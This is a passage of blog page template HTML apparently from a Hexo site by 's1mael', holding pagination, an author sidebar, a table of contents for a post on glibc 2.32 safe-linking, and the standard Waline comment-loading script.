class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/samael.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">s1mael</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/s1mael" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ma060721@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eglibc2-32%E5%BC%95%E5%85%A5%E7%9A%84safe-linking%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">关于glibc2.32引入的safe-linking的一些总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/safe-linking/" title="关于glibc2.32引入的safe-linking的一些总结">关于glibc2.32引入的safe-linking的一些总结</a><time datetime="2026-04-12T14:05:00.000Z" title="发表于 2026-04-12 22:05:00">2026-04-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hello-world/" title="Hello World">Hello World</a><time datetime="2025-03-20T03:46:30.000Z" title="发表于 2025-03-20 11:46:30">2025-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By s1mael</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"lang":"zh-CN","requiredMeta":["nick","mail"],"login":"disable","wordLimit":1000}
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://s1mael-waline-bn0i7q9ub-s1maels-projects.vercel.app',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
